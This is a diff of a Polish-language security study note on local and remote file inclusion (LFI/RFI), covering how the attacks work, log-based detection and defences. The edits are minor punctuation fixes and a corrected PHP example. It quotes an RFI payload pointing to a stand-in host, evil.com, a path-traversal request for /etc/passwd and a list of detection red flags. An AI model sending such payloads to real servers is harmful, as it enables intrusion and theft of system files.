@@ -4,7 +4,7 @@
 Zapoznanie się i zrozumienie mechaniki działania ataku LFI/RFI oraz sposobów jego wykrywania i obrony przed nim.
 
 ## Co to jest 
-- LFI - Local File Inclusion - to atak, w którym aplikacja dołącza lokalny plik na podstawie danych od użytkownika, np parametru `?page=...`, 
+- LFI - Local File Inclusion - to atak, w którym aplikacja dołącza lokalny plik na podstawie danych od użytkownika, np. parametru `?page=...`, 
 - RFI - Remote File Inclusion - podobnie jak wyżej, z tą różnicą, że plik aplikacja pobiera z zewnętrznego serwera. 
 
 ## Cel
@@ -32,7 +32,7 @@ Zapoznanie się i zrozumienie mechaniki działania ataku LFI/RFI oraz sposobów 
 Tak samo jak LFI z tą różnicą, że plik jest na serwerze atakującego, nie lokalnie. Np. `?page=http://evil.com/shell.txt`. Aplikacja pobiera plik z `evil.com` i wykonuje go. To bardzo niebezpieczny scenariusz, ponieważ atakujący nie musi wgrywać pliku na serwer ofiary, wystarczy, że ma własny serwer z kodem. Aplikacja sama go pobierze i uruchomi. Warunek: RFI zadziała wyłącznie wtedy, gdy aplikacja pozwala na dołączanie zdalnych plików `allow_url_include` (domyślnie wyłączone). Dlatego warto zwrócić uwagę czy ten parametr nie został włączony. 
 
 ## Jak wykryć 
-- w logach serwera - czerwone flagi: `../`, `..%2f`, `%2e%2e%2f`, `/etc/passwd`, `/etc/shadow`, `C:\Windows\`, `http://`, `https://`, `ftp://`, `.php`, `.jsp`, `.asp` w parametrze include. Np: `GET /index.php?page=../../etc/passwd HTTP/1.1 200`, 
+- w logach serwera - czerwone flagi: `../`, `..%2f`, `%2e%2e%2f`, `/etc/passwd`, `/etc/shadow`, `C:\Windows\`, `http://`, `https://`, `ftp://`, `.php`, `.jsp`, `.asp` w parametrze include. Np. `GET /index.php?page=../../etc/passwd HTTP/1.1 200`, 
 - w logach aplikacji - jeśli aplikacja loguje wywołania `include/require` sprawdzenie pod kątem:
 	- plików dołączanych spoza aplikacji, 
 	- dołączonych plików z rozszerzeniem `.php` w katalogach upload, 
@@ -57,7 +57,7 @@ Tak samo jak LFI z tą różnicą, że plik jest na serwerze atakującego, nie l
 
 ## Jak się bronić
 - biała lista plików - aplikacja pozwala tylko na określone pliki, np. `about.php`, `home.php`, itp, 
-- unikanie dynamicznego `include` - zamiast używać `include($_GET['page'])` można użyć `if ($page == 'home') include; home.php`, 
+- unikanie dynamicznego `include` - zamiast używać `include($_GET['page'])` można użyć `if ($page == 'home') include home.php;`, 
 - wyłączenie `allow_url_include` - to zabezpieczy przed pobieraniem plików z linku i zablokuje RFI, 
 - walidacja ścieżki - czyli sprawdzanie pod kątem niedozwolonych znaków, 
 - minimalne uprawnienia - aplikacja nie powinna działać jako root, 
